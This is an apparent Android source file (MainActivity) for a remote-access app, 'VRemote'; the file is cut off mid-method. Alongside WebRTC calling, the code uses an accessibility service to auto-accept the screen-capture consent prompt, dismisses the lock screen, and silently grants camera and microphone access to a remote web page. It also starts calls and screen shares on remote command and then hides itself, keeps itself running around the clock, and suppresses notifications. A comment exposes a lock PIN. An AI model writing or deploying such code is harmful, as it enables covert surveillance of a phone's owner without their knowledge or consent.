package com.tokendeal.vremote;

import android.Manifest;
import android.app.Activity;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.PictureInPictureParams;
import android.app.RemoteAction;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.drawable.Icon;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Rational;
import android.view.WindowManager;
import android.webkit.*;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.webrtc.VideoTrack;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements WebRTCCompanion.Callback {

    private static final String TAG = "VRemoteMain";
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static final int REQUEST_PERMISSIONS = 2001;
    private static final int FILE_CHOOSER_REQUEST_CODE = 2002;
    private static final String APP_URL = "https://v.tokendeal.cloud";
    private static final String PREF_NAME = "VRemoteDevicePrefs";
    private static final String KEY_HAS_PROMPTED_ACCESSIBILITY = "has_prompted_accessibility";

    private static MainActivity sInstance = null;
    public static MainActivity getInstance() {
        if (sInstance != null && (sInstance.isFinishing() || (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 && sInstance.isDestroyed()))) {
            return null;
        }
        return sInstance;
    }
    private static WebRTCCompanion sWebRTCCompanion = null;
    public static WebRTCCompanion getCompanionInstance() { return sWebRTCCompanion; }
    public WebRTCCompanion getWebRTCCompanion() { return sWebRTCCompanion; }

    private WebView webView;
    private ValueCallback<Uri[]> mFilePathCallback = null;
    private MediaProjectionManager projectionManager;
    private Intent captureIntentData = null;
    private WebRTCCompanion webRTCCompanion = null;
    private android.os.PowerManager.WakeLock wakeLock = null;

    private String pendingTargetPeer = "";
    private boolean isFullControlEnabled = true;
    private boolean streamCompanionCamera = true;
    private String companionCameraChoice = "front";
    private boolean isCallActive = false;
    private boolean hasPromptedAccessibility = false;
    private boolean isStoppingMedia = false;
    private boolean isScreenCaptureRequestPending = false;
    private boolean isActivityInForeground = false;
    private static long sLastStopTime = 0;
    private static long sLastHomeExecutionTime = 0;

    private final BroadcastReceiver mEndCallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            AppLogs.i(TAG, "ACTION_END_CALL broadcast received, finishing activity");
            stopAllMediaAndFinish();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sInstance = this;

        // Initialize global crash safety shield
        VRemoteApplication.installGlobalCrashHandler(this);
        AppLogs.i(TAG, "MainActivity onCreate: Activity launched");

        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            hasPromptedAccessibility = prefs.getBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, false);
        } catch (Exception ignored) {}

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                km.requestDismissKeyguard(this, null);
            }
        } else {
            getWindow().addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            );
        }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        setContentView(R.layout.activity_main);

        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "VRemote::WakeLock");
                wakeLock.acquire(12 * 60 * 60 * 1000L /* 12 hours */);
            }
        } catch (Exception ignored) {}

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        // Start 24/7 background companion service immediately
        BackgroundKeepAliveService.startService(this);

        requestAppPermissions();
        initWebRTC();
        initWebView();
        // Register broadcast listener for remote disconnect/end-call
        try {
            IntentFilter filter = new IntentFilter("com.tokendeal.vremote.ACTION_END_CALL");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(mEndCallReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(mEndCallReceiver, filter);
            }
        } catch (Exception ignored) {}

        // Check if there was any uncaught crash in previous session and upload to server logs
        CrashReporter.checkAndReportPreviousCrash(this);

        handleAutoCommandIntent(getIntent());

        // Enqueue 30-minute WorkManager keep-alive worker to support all devices even when app is stopped
        KeepAliveScheduler.schedulePeriodicWork(this);
    }

    private void requestAppPermissions() {
        List<String> permList = new ArrayList<>();
        permList.add(Manifest.permission.CAMERA);
        permList.add(Manifest.permission.RECORD_AUDIO);
        permList.add(Manifest.permission.MODIFY_AUDIO_SETTINGS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permList.add(Manifest.permission.READ_MEDIA_IMAGES);
            permList.add(Manifest.permission.READ_MEDIA_VIDEO);
            permList.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            permList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        List<String> needed = new ArrayList<>();
        for (String perm : permList) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadsImagesAutomatically(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.clearCache(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                Uri uri = request.getUrl();
                if (uri != null && "vremote".equalsIgnoreCase(uri.getScheme())) {
                    return true;
                }
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "WebView loaded page: " + url);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public Bitmap getDefaultVideoPoster() {
                // Return 1x1 blank transparent bitmap so Android never renders the default play icon thumbnail
                return Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888);
            }

            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(() -> {
                    Log.i(TAG, "Granting WebRTC permissions to WebView: " + java.util.Arrays.toString(request.getResources()));
                    request.grant(request.getResources());
                });
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                Log.i(TAG, "onShowFileChooser triggered");
                // Clear any prior pending callback so WebView never hangs
                if (mFilePathCallback != null) {
                    mFilePathCallback.onReceiveValue(null);
                    mFilePathCallback = null;
                }
                mFilePathCallback = filePathCallback;

                Intent intent = null;
                if (fileChooserParams != null) {
                    try {
                        intent = fileChooserParams.createIntent();
                    } catch (Exception e) {
                        Log.e(TAG, "fileChooserParams.createIntent() failed: " + e.getMessage());
                    }
                }
                if (intent == null) {
                    intent = new Intent(Intent.ACTION_GET_CONTENT);
                    intent.addCategory(Intent.CATEGORY_OPENABLE);
                    intent.setType("*/*");
                }

                try {
                    Intent chooserIntent = Intent.createChooser(intent, "Select File");
                    startActivityForResult(chooserIntent, FILE_CHOOSER_REQUEST_CODE);
                    return true;
                } catch (Exception e) {
                    Log.e(TAG, "Failed to launch file chooser intent", e);
                    if (mFilePathCallback != null) {
                        mFilePathCallback.onReceiveValue(null);
                        mFilePathCallback = null;
                    }
                    return false;
                }
            }
        });

        // Add Native Android Bridge for Screen Capture & Remote Control
        webView.addJavascriptInterface(new NativeAppBridge(), "VRemoteNative");

        // Clean URL load without query params or IDs so the Lock screen (PIN 7861) is required
        webView.loadUrl(APP_URL);
    }

    private void initWebRTC() {
        if (sWebRTCCompanion == null) {
            sWebRTCCompanion = new WebRTCCompanion(getApplicationContext(), APP_URL, DeviceRegistry.getDeviceId(this), this);
        } else {
            sWebRTCCompanion.setCallback(this);
        }
        webRTCCompanion = sWebRTCCompanion;
    }

    public void startMediaForegroundService(String type) {
        try {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            serviceIntent.putExtra("session_type", type);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            AppLogs.i(TAG, "ScreenCaptureService started in foreground for: " + type);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start media foreground service: " + e.getMessage(), e);
            AppLogs.e(TAG, "Failed to start media foreground service: " + e.getMessage());
        }
    }

    public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
        pendingTargetPeer = (targetPeer != null && !targetPeer.isEmpty()) ? targetPeer : "";
        isFullControlEnabled = fullControl;
        streamCompanionCamera = streamCamera;
        companionCameraChoice = (cameraChoice != null) ? cameraChoice : "front";

        if (webRTCCompanion != null) {
            webRTCCompanion.setFullControlEnabled(fullControl);
        }

        runOnUiThread(() -> {
            // Android 14 strictly forbids reusing MediaProjection resultData Intent tokens.
            if (webRTCCompanion != null && webRTCCompanion.isScreenSharing()) {
                Log.w(TAG, "Previous screen sharing session detected; resetting prior session before new request");
                try {
                    webRTCCompanion.endCall(false);
                    webRTCCompanion.cleanupActiveMediaSession();
                } catch (Exception ignored) {}
            }

            isScreenCaptureRequestPending = true;
            captureIntentData = null;

            // Arm accessibility service to auto-click "Start now" without manual phone interaction
            RemoteAccessibilityService.triggerAutoAccept(MainActivity.this);

            // Android 14: If activity is not in foreground, bring it to front before requesting screen capture
            if (!isActivityInForeground) {
                try {
                    Intent bringToFront = new Intent(MainActivity.this, MainActivity.class);
                    bringToFront.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    if (Build.VERSION.SDK_INT >= 34) {
                        android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                        opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                        startActivity(bringToFront, opt.toBundle());
                    } else {
                        startActivity(bringToFront);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Failed bringing MainActivity to front: " + e.getMessage());
                }
            }

            if (projectionManager == null) {
                projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            }

            if (projectionManager != null) {
                try {
                    startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
                } catch (Exception e) {
                    Log.e(TAG, "startActivityForResult failed: " + e.getMessage(), e);
                    isScreenCaptureRequestPending = false;
                }
            } else {
                isScreenCaptureRequestPending = false;
            }
        });
    }

    public class NativeAppBridge {
        @JavascriptInterface
        public boolean isNativeApp() {
            return true;
        }

        @JavascriptInterface
        public boolean isAccessibilityRunning() {
            return RemoteAccessibilityService.isServiceRunningOrEnabled(MainActivity.this);
        }

        @JavascriptInterface
        public void openAccessibilitySettings() {
            runOnUiThread(() -> {
                Toast.makeText(MainActivity.this, "Find 'VRemote Screen Share' and switch it ON", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            });
        }

        @JavascriptInterface
        public void setCallActive(boolean active) {
            MainActivity.this.isCallActive = active;
        }

        @JavascriptInterface
        public void startScreenCapture(String targetPeer, boolean fullControl) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, true, "front");
        }

        @JavascriptInterface
        public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, streamCamera, cameraChoice);
        }

        @JavascriptInterface
        public void enterPip() {
            runOnUiThread(MainActivity.this::enterWhatsAppStylePipOrBack);
        }

        @JavascriptInterface
        public void stopScreenCapture() {
            runOnUiThread(() -> {
                if (webRTCCompanion != null) {
                    webRTCCompanion.endCall(true);
                }
                Intent serviceIntent = new Intent(MainActivity.this, ScreenCaptureService.class);
                stopService(serviceIntent);
                Toast.makeText(MainActivity.this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
            });
        }

        @JavascriptInterface
        public void setMyId(String newId) {
            if (webRTCCompanion != null && newId != null) {
                webRTCCompanion.setMyId(newId);
            }
        }

        @JavascriptInterface
        public void setSpeakerphone(boolean loud) {
            runOnUiThread(() -> {
                try {
                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    if (am != null) {
                        am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION);
                        am.setSpeakerphoneOn(loud);
                        Log.i(TAG, "Audio routed via JS bridge: speakerphone=" + loud);
                    }
                } catch (Exception ignored) {}
            });
        }

        @JavascriptInterface
        public String getDeviceId() {
            return DeviceRegistry.getDeviceId(MainActivity.this);
        }

        @JavascriptInterface
        public boolean isInCall() {
            return isCallActive || (webRTCCompanion != null && webRTCCompanion.isInCall());
        }

        @JavascriptInterface
        public String getDeviceInfo() {
            try {
                org.json.JSONObject info = new org.json.JSONObject();
                info.put("deviceId", DeviceRegistry.getDeviceId(MainActivity.this));
                info.put("deviceName", DeviceRegistry.getDeviceModel());
                info.put("ram", DeviceRegistry.getDeviceRam(MainActivity.this));
                info.put("platform", "android");
                return info.toString();
            } catch (Exception e) {
                return "{}";
            }
        }

        @JavascriptInterface
        public String getPermissionsStatus() {
            try {
                org.json.JSONObject status = new org.json.JSONObject();
                // 1. Camera
                boolean cameraOk = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
                status.put("camera", cameraOk ? "granted" : "denied");

                // 2. Microphone
                boolean micOk = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
                status.put("microphone", micOk ? "granted" : "denied");

                // 3. Storage
                boolean storageOk;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    storageOk = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                             || ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
                             || ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
                             || ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
                } else {
                    storageOk = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
                }
                status.put("storage", storageOk ? "granted" : "denied");

                // 4. Remote Touch Control (Accessibility)
                boolean accOk = RemoteAccessibilityService.isServiceRunningOrEnabled(MainActivity.this);
                status.put("accessibility", accOk ? "granted" : "denied");

                // 5. 24/7 Background Service
                boolean bgOk = BackgroundKeepAliveService.isServiceRunning(MainActivity.this);
                status.put("background_service", bgOk ? "granted" : "denied");

                // 6. Battery Optimization (Unrestricted / Doze Bypass)
                boolean batteryOk = true;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                    batteryOk = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                }
                status.put("battery_optimization", batteryOk ? "granted" : "denied");

                // 7. Display Over Other Apps (Overlay / Screen Control)
                boolean overlayOk = true;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    overlayOk = Settings.canDrawOverlays(MainActivity.this);
                }
                status.put("overlay", overlayOk ? "granted" : "denied");
                status.put("screen_sharing", overlayOk ? "granted" : "denied");

                // 8. Notifications - suppressed / not used
                status.put("notifications", "granted");

                return status.toString();
            } catch (Exception e) {
                return "{}";
            }
        }

        @JavascriptInterface
        public void openAppSettings() {
            runOnUiThread(() -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(android.net.Uri.fromParts("package", getPackageName(), null));
                    startActivity(intent);
                } catch (Exception ignored) {}
            });
        }

        @JavascriptInterface
        public void openBatterySettings() {
            runOnUiThread(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                            return;
                        } catch (Exception ignored) {}
                    }
                    Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    startActivity(intent);
                } catch (Exception ignored) {
                    openAppSettings();
                }
            });
        }

        @JavascriptInterface
        public void openOverlaySettings() {
            runOnUiThread(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                        intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                        return;
                    }
                    openAppSettings();
                } catch (Exception ignored) {
                    openAppSettings();
                }
            });
        }

        @JavascriptInterface
        public void startBackgroundService() {
            runOnUiThread(() -> {
                try {
                    try {
                        getSharedPreferences(BackgroundKeepAliveService.PREF_NAME, Context.MODE_PRIVATE)
                                .edit().putBoolean(BackgroundKeepAliveService.KEY_BG_ACTIVE, true).apply();
                        File bgFile = new File(getFilesDir(), BackgroundKeepAliveService.HEARTBEAT_FILE);
                        if (!bgFile.exists()) bgFile.createNewFile();
                        bgFile.setLastModified(System.currentTimeMillis());
                    } catch (Exception ignored) {}

                    BackgroundKeepAliveService.startService(MainActivity.this);
                    KeepAliveScheduler.schedulePeriodicWork(MainActivity.this);
                    Toast.makeText(MainActivity.this, "Background Service Started", Toast.LENGTH_SHORT).show();

                    // Immediately re-trigger loadPermissions in WebView so the UI reflects "✓ Active & Allowed"
                    if (webView != null) {
                        webView.postDelayed(() -> {
                            try {
                                webView.evaluateJavascript("if (typeof loadPermissions === 'function') loadPermissions(); else if (typeof window.loadPermissions === 'function') window.loadPermissions();", null);
                            } catch (Exception ignored) {}
                        }, 400);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start Background Service", e);
                }
            });
        }

        @JavascriptInterface
        public void openNotificationSettings() {
            runOnUiThread(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        Intent intent = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                        intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
                        startActivity(intent);
                        return;
                    }
                    openAppSettings();
                } catch (Exception ignored) {
                    openAppSettings();
                }
            });
        }

        @JavascriptInterface
        public void requestPermission(String key) {
            runOnUiThread(() -> {
                try {
                    if ("accessibility".equalsIgnoreCase(key)) {
                        openAccessibilitySettings();
                    } else if ("battery_optimization".equalsIgnoreCase(key)) {
                        openBatterySettings();
                    } else if ("overlay".equalsIgnoreCase(key) || "screen_sharing".equalsIgnoreCase(key)) {
                        openOverlaySettings();
                    } else if ("background_service".equalsIgnoreCase(key)) {
                        startBackgroundService();
                    } else if ("camera".equalsIgnoreCase(key)) {
                        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.CAMERA}, REQUEST_PERMISSIONS);
                    } else if ("microphone".equalsIgnoreCase(key)) {
                        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECORD_AUDIO}, REQUEST_PERMISSIONS);
                    } else if ("storage".equalsIgnoreCase(key)) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            ActivityCompat.requestPermissions(MainActivity.this, new String[]{
                                    Manifest.permission.READ_MEDIA_IMAGES,
                                    Manifest.permission.READ_MEDIA_VIDEO,
                                    Manifest.permission.READ_MEDIA_AUDIO
                            }, REQUEST_PERMISSIONS);
                        } else {
                            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQUEST_PERMISSIONS);
                        }
                    } else if ("notifications".equalsIgnoreCase(key)) {
                        // Notifications disabled by design - no prompt
                    } else {
                        openAppSettings();
                    }
                } catch (Exception ignored) {}
            });
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        if (intent != null && "ACTION_STOP_SHARE".equals(intent.getAction())) {
            stopAllMediaAndFinish();
            Toast.makeText(this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
            return;
        }
        handleAutoCommandIntent(intent);
    }

    private long lastAutoCmdTime = 0;
    private String lastExecutedCommand = "";
    private String pendingAutoCommand = null;
    private String pendingCaller = null;
    private String pendingCamChoice = null;
    private final android.os.Handler autoCmdHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private final Runnable pendingAutoCmdRunnable = this::executePendingAutoCommand;

    private void handleAutoCommandIntent(Intent intent) {
        if (intent == null) return;
        String autoCmd = intent.getStringExtra("auto_command");
        String caller = intent.getStringExtra("caller");
        String camChoice = intent.getStringExtra("cameraChoice");
        if (autoCmd == null || autoCmd.isEmpty()) return;
        intent.removeExtra("auto_command");
        intent.removeExtra("caller");
        intent.removeExtra("cameraChoice");
        setIntent(intent);
        handleAutoCommandDirectly(autoCmd, caller, camChoice);
    }

    public synchronized void handleAutoCommandDirectly(String autoCmd, String caller, String camChoice) {
        if (autoCmd == null || autoCmd.isEmpty()) return;

        long now = System.currentTimeMillis();
        if ((now - lastAutoCmdTime < 3000 && autoCmd.equals(lastExecutedCommand)) || (now - lastAutoCmdTime < 1000)) {
            Log.w(TAG, "Ignoring duplicate auto_command: " + autoCmd);
            return;
        }
        lastAutoCmdTime = now;
        lastExecutedCommand = autoCmd;

        Log.i(TAG, "Handling auto_command directly: " + autoCmd + " from " + caller);
        autoCmdHandler.removeCallbacks(pendingAutoCmdRunnable);
        pendingAutoCommand = autoCmd;
        pendingCaller = (caller != null && !caller.isEmpty()) ? caller : "";
        pendingCamChoice = (camChoice != null && !camChoice.isEmpty()) ? camChoice : "front";

        if (webRTCCompanion == null) {
            initWebRTC();
        }

        if (webRTCCompanion != null && webRTCCompanion.isSocketConnected()) {
            executePendingAutoCommand();
        } else {
            Log.i(TAG, "webRTCCompanion not connected yet, waiting for onConnected callback...");
            autoCmdHandler.postDelayed(pendingAutoCmdRunnable, 1500);
        }
    }

    private synchronized void executePendingAutoCommand() {
        autoCmdHandler.removeCallbacks(pendingAutoCmdRunnable);
        if (pendingAutoCommand == null) return;
        if (webRTCCompanion == null) {
            initWebRTC();
            return;
        }

        String autoCmd = pendingAutoCommand;
        String caller = pendingCaller;
        String camChoice = pendingCamChoice;
        pendingAutoCommand = null;

        Log.i(TAG, "Executing pending auto_command: " + autoCmd + " for caller: " + caller);
        AppLogs.i(TAG, "Executing pending auto_command: " + autoCmd + " for caller: " + caller);
        switch (autoCmd) {
            case "audio_call":
                startMediaForegroundService("audio_call");
                webRTCCompanion.startAudioCall(caller);
                runOnUiThread(() -> {
                    try {
                        moveTaskToBack(true);
                    } catch (Exception ignored) {}
                });
                break;
            case "video_call":
                startMediaForegroundService("video_call");
                webRTCCompanion.startVideoCall(caller);
                runOnUiThread(() -> {
                    try {
                        moveTaskToBack(true);
                    } catch (Exception ignored) {}
                });
                break;
            case "screen_share":
                startScreenCaptureWithCamera(caller, false, false, "none");
                break;
            case "screen_share_control":
                startScreenCaptureWithCamera(caller, true, false, "none");
                break;
            case "end_call":
                stopAllMediaAndFinish();
                break;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            isScreenCaptureRequestPending = false;
            if (resultCode == Activity.RESULT_OK && data != null) {
                AppLog.i(TAG, "Screen capture permission granted by user");
                captureIntentData = (Intent) data.clone();
                startScreenStreaming();
            } else {
                captureIntentData = null;
                AppLog.w(TAG, "Screen capture was cancelled on phone");
                Toast.makeText(this, "Screen capture was cancelled", Toast.LENGTH_SHORT).show();
                if (webRTCCompanion != null) {
                    webRTCCompanion.emitDeviceError("Screen capture permission was cancelled on phone");
                }
            }
        } else if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
            if (mFilePathCallback != null) {
                Uri[] results = null;
                if (resultCode == Activity.RESULT_OK && data != null) {
                    try {
                        results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
                    } catch (Exception e) {
                        Log.e(TAG, "FileChooserParams.parseResult error: " + e.getMessage());
                    }
                    if (results == null) {
                        if (data.getClipData() != null) {
                            int count = data.getClipData().getItemCount();
                            results = new Uri[count];
                            for (int i = 0; i < count; i++) {
                                results[i] = data.getClipData().getItemAt(i).getUri();
                            }
                        } else if (data.getData() != null) {
                            results = new Uri[]{ data.getData() };
                        } else if (data.getDataString() != null) {
                            results = new Uri[]{ Uri.parse(data.getDataString()) };
                        }
                    }
                }
                // Always invoke callback with results (or null on cancel/error) so WebView unblocks
                mFilePathCallback.onReceiveValue(results);
                mFilePathCallback = null;
            }
        }
    }

    private void startScreenStreaming() {
        if (captureIntentData == null) {
            Log.e(TAG, "startScreenStreaming called with null captureIntentData");
            if (webRTCCompanion != null) {
                webRTCCompanion.emitDeviceError("Screen capture permission token was null");
            }
            return;
        }

        final Intent tokenIntent = (Intent) captureIntentData.clone();
        captureIntentData = null; // Consume immediately so token is strictly single-use

        ScreenCaptureService.prepareForStart();
        ScreenCaptureService.setOnForegroundStartedListener(() -> {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);

            if (webRTCCompanion != null) {
                webRTCCompanion.startScreenShare(
                        pendingTargetPeer,
                        tokenIntent,
                        displayMetrics.widthPixels,
                        displayMetrics.heightPixels,
                        streamCompanionCamera,
                        companionCameraChoice
                );
            }

            // Allow WebRTC to acquire MediaProjection token in foreground before hiding to background
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    moveTaskToBack(true);
                } catch (Exception ignored) {}
                try {
                    Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                    homeIntent.addCategory(Intent.CATEGORY_HOME);
                    homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(homeIntent);
                } catch (Exception ignored) {}
                if (RemoteAccessibilityService.getInstance() != null) {
                    try {
                        RemoteAccessibilityService.getInstance().performHome();
                    } catch (Exception ignored) {}
                }
            }, 800);
        });

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("session_type", "screen_share");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public void enterWhatsAppStylePipOrBack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                PictureInPictureParams.Builder pipBuilder = new PictureInPictureParams.Builder();
                pipBuilder.setAspectRatio(new Rational(9, 16));

                ArrayList<RemoteAction> actions = new ArrayList<>();
                Intent endIntent = new Intent(this, MainActivity.class);
                endIntent.setAction("ACTION_STOP_SHARE");
                PendingIntent endPi = PendingIntent.getActivity(
                        this, 101, endIntent,
                        PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                );
                Icon endIcon = Icon.createWithResource(this, android.R.drawable.ic_menu_close_clear_cancel);
                RemoteAction endAction = new RemoteAction(endIcon, "Stop Share", "End Screen Sharing", endPi);
                actions.add(endAction);
                pipBuilder.setActions(actions);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    pipBuilder.setAutoEnterEnabled(false);
                    pipBuilder.setSeamlessResizeEnabled(true);
                }
                boolean entered = enterPictureInPictureMode(pipBuilder.build());
                if (entered) {
                    return;
                }
            } catch (Exception e) {
                Log.w(TAG, "PictureInPicture not supported or failed: " + e.getMessage());
            }
        }
        moveTaskToBack(true);
    }

    @Override
    public void onUserLeaveHint() {
        super.onUserLeaveHint();
        // Strict manual-only PiP: Do NOT enter PiP automatically on home button press.
